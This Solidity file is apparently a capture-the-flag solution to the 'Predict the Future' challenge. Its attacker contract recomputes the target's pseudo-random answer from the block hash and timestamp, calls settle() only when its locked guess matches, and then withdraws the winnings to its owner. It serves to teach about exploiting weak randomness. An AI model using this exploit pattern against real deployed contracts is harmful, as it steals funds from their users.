pragma solidity ^0.8.15;

interface PredictTheFutureChallenge {
    
    function lockInGuess(uint8) external payable;

    function settle() external;
}

contract Soln {
    PredictTheFutureChallenge challenge;
    uint8 myAnswer;
    address payable owner;

    event CurrentGuess(uint8);

    constructor(address challangeContract) {
        owner = payable(msg.sender);
        challenge = PredictTheFutureChallenge(challangeContract);
    }

    function lock(uint8 n) public {
        myAnswer = n;
        challenge.lockInGuess{value: 1 ether}(n); // I'll send ether to the contract after deployment
    }

    function solve() public {
        uint8 curAnswer = uint8(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))[31]) % 10;
        emit CurrentGuess(curAnswer);
        if(myAnswer == curAnswer){
            challenge.settle();
        }
    }

    function giveBack() public {
        require(msg.sender == owner);

        owner.transfer(address(this).balance);
    }

    receive() external payable{

    }

    fallback() external {

    }

}